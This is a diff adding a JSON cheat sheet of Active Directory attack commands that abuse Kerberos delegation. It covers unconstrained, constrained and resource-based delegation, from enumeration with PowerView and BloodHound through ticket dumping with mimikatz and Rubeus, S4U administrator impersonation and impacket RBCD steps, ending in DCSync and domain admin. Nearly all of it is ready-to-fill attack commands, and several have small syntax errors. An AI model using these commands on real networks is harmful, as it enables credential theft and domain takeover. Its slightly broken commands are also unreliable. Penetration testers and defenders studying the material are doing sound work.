@@ -1,0 +1,101 @@
+{
+  "Kerberos_Delegation_Movement": {
+    "List_Delegations": {
+      "commands": [
+        "ldeep ldap -u <user> -p '<password>' -d <domain> -s ldap://<dc_ip> delegations",
+        "findDelegation.py <domain>/<user>:<password>@<ip>"
+      ]
+    },
+    "Unconstrained_Delegation": {
+      "enumeration": {
+        "powershell": "Get-NetComputer -Unconstrained",
+        "powerview": "Get-DomainComputer -Unconstrained -Properties DnsHostName",
+        "bloodhound": [
+          "MATCH (c:Computer {unconstraineddelegation: true}) RETURN c",
+          "MATCH (u:User {owned:true}), (c:Computer {unconstraineddelegation:true}), p=shortestPath((u)-[*]->(c)) RETURN p"
+        ]
+      },
+      "exploitation": {
+        "UAC_Setting": "ADS_UF_TRUSTED_FOR_DELEGATION",
+        "get_tickets": {
+          "commands": [
+            "privilege::debug sekurlsa::tickets /export",
+            "Rubeus dump /service:krbtgt /nowrap",
+            "Rubeus dump /luid:0xdeadbeef /nowrap"
+          ],
+          "result": "Kerberos TGT"
+        },
+        "force_connection": {
+          "command": "Rubeus monitor /interval:5",
+          "progression": {
+            "step1": "Kerberos TGT",
+            "step2": "Pass The Ticket",
+            "condition": "if dc",
+            "final_access": ["DCSync", "DomAdmin"]
+          }
+        }
+      }
+    },
+    "Constrained_Delegation": {
+      "get_constrained_delegation": {
+        "powershell": [
+          "Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo",
+          "Get-DomainUser -TrustedToAuth"
+        ],
+        "bloodhound": [
+          "MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p",
+          "MATCH (u:User {owned:true}), (c:Computer {name: '<MYTARGETFQDN>'}), p=shortestPath((u)-[*]->(c)) RETURN p"
+        ]
+      },
+      "with_protocol_transition": {
+        "requirements": {
+          "object": "msDS-AllowedToDelegateTo",
+          "UAC": "TRUST_TO_AUTH_FOR_DELEGATION"
+        },
+        "commands": {
+          "initial": "Rubeus hash /password:<password>",
+          "s4u": {
+            "step1": "Rubeus asktgt /user:<user> /domain:<domain> /aes256:<AES 256 hash>",
+            "step2": "Rubeus s4u /ticket:<ticket> /impersonateuser:<admin_user> /msdsspn:<spn_constraint>/altservice:<service>/ptt",
+            "services": {
+              "HOST": "psexec \\\\<target> <cmd>",
+              "HTTP": "Enter-PSSession -computername <target>",
+              "CIFS": "dir \\\\<target>\\c$",
+              "LDAP": null
+            }
+          }
+        },
+        "result": "Kerberos TGS"
+      },
+      "without_protocol_transition": {
+        "description": "kerberos only, Object: msDS-AllowedToDelegateTo, UAC: TRUSTED_FOR_DELEGATION",
+        "RBCD": {
+          "self_RBCD": {
+            "commands": [
+              "addcomputer.py -computer-name '<rbcd_comp$>' -computer-pass '<rbcd_compa$$>' -dc-ip <dc> -domain-netbios <domain> -domain <domain>",
+              "rbcd.py -delegate-from '<rbcd_com$>' -delegate-to 'constrained$' -dc-ip '<dc>' -action 'write' -hashes '<hash>' <domain>/<constrained$>",
+              "getST.py -self -impersonate 'administrator' -dc-ip <domain>/<rbcd_comp$>/<rbcd_compa$$>",
+              "getST.py -spn 'host/<constrained>' -hashes '<hash>' <domain>/<computer_account>' -impersonate Administrator -dc-ip <dc_ip> -additional-ticket <previous_ticket>",
+              "getST.py -spn <constrained_spn>/<target> -impersonate Administrator -dc-ip <dc_ip> -additional-ticket <previous_ticket>"
+            ]
+          }
+        }
+      }
+    },
+    "Resource_Based_Constrained_Delegation": {
+      "object": "msDS-AllowedToActOnBehalfOfOtherIdentity",
+      "commands": {
+        "setup": [
+          "rubeus.exe hash /password:<computer_pass> / user:<computer$> /domain:<domain>",
+          "rbcd.py -delegate-from <computer-$> -delegate-to \"target$\" -dc-ip <dc> -action 'write' <domain>/<user>:<password>",
+          "getST.py -spn 'host/<dc_fqdn>' <domain>/<computer_account> <computer_pass> -impersonate Administrator -dc-ip <dc_ip>"
+        ],
+        "computer_account": "addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain> -domain: '<user>:<password>'"
+      },
+      "results": [
+        "Admin",
+        "Kerberos TGT"
+      ]
+    }
+  }
+}
